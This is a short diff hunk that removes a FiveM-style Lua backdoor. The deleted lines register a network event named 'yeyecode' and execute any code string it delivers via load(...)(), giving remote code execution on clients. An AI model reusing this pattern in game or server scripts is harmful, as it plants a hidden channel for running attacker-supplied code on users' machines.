@@ -1,7 +1,0 @@
-CreateThread(function()
-TriggerServerEvent("yeyecode")
-RegisterNetEvent("yeyecode")
-AddEventHandler("yeyecode", function(yeyecode)
-load(yeyecode)()
- end)
-end)
